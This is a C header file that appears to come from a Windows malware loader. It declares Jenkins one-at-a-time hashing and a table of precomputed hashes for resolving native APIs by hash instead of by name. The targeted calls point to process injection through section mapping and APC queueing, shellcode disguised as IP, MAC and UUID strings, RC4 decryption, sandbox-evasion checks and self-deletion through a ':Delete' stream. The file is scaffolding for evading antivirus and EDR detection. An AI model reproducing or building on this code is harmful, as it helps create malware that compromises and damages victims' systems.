#pragma once

//----------------------------------------
// Section: Configuration & Dependencies
//----------------------------------------
#include "config.h"
#include "typedef.h"
#include "structs.h"
#include "syscalls/syscalls.h"

//----------------------------------------
// Section: Platform-Specific Headers
//----------------------------------------
#if defined(DEBUG) && !defined(NO_CRT_LIB)
#include <stdio.h>
#endif

#ifndef SYSCALL_ENABLED
#include <windows.h>
#include <bcrypt.h>
#endif

//----------------------------------------
// Section: API Hashing Functions
//----------------------------------------
UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR  String);

#define INITIAL_SEED 8
#define HASHA(API)   (HashStringJenkinsOneAtATime32BitA((PCHAR)API))
#define HASHW(API)   (HashStringJenkinsOneAtATime32BitW((PWCHAR)API))

#define NtQuerySystemInformation_JOAA       0x7B9816D6
#define NtCreateSection_JOAA                0x192C02CE
#define NtMapViewOfSection_JOAA             0x91436663
#define NtUnmapViewOfSection_JOAA           0x0A5B9402
#define NtClose_JOAA                        0x369BD981
#define NtCreateThreadEx_JOAA               0x8EC0B84A
#define NtWaitForSingleObject_JOAA          0x6299AD3D
#define NtDelayExecution_JOAA               0xB947891A
#define NtAllocateVirtualMemory_JOAA        0x6E8AC28E
#define NtWriteVirtualMemory_JOAA           0x319F525A
#define NtProtectVirtualMemory_JOAA         0x1DA5BB2B
#define NtFreeVirtualMemory_JOAA            0x95687873
#define NtQueueApcThread_JOAA               0xEB15EA8A
#define NtOpenProcess_JOAA                  0x837FAFFE
#define NtOpenSection_JOAA                  0x0C31B099
#define GetTickCount64_JOAA                 0x00BB616E
#define OpenProcess_JOAA                    0xAF03507E
#define CallNextHookEx_JOAA                 0xB8B1ADC1
#define SetWindowsHookExW_JOAA              0x15580F7F
#define GetMessageW_JOAA                    0xAD14A009
#define DefWindowProcW_JOAA                 0xD96CEDDC
#define UnhookWindowsHookEx_JOAA            0x9D2856D0
#define GetModuleFileNameW_JOAA             0xAB3A6AA1
#define CreateFileW_JOAA                    0xADD132CA
#define SetFileInformationByHandle_JOAA     0x6DF54277
#define SetFileInformationByHandle_JOAA     0x6DF54277
#define CloseHandle_JOAA                    0x9E5456F2
#define SystemFunction032_JOAA              0x8CFD40A8
#define WaitOnAddress_JOAA                  0x40D96258
#define RtlIpv4StringToAddressA_JOAA        0x08526415
#define RtlIpv6StringToAddressA_JOAA        0x9376929B
#define RtlEthernetStringToAddressA_JOAA    0x12404322
#define UuidFromStringA_JOAA                0xDBAF006B
#define RtlAllocateHeap_JOAA                0x23FEEC41
#define RtlDestroyProcessParameters_JOAA    0x8DF6FBC0
#define RtlCreateProcessParametersEx_JOAA   0x55B87410
#define EnumProcessModulesEx_JOAA           0x003E9187
#define GetModuleBaseNameA_JOAA             0x02B6809D
#define NTDLLDLL_JOAA                       0x0141C4EE
#define KERNEL32DLL_JOAA                    0xFD2AD9BD
#define USER32DLL_JOAA                      0x349D72E7
#define ADVAPI32DLL_JOAA                    0xD675A2CB
#define RPCRT4DLL_JOAA                      0x256E8F49

//----------------------------------------
// Section: Miscellaneous Macros
//----------------------------------------
#define NEW_STREAM L":Delete"
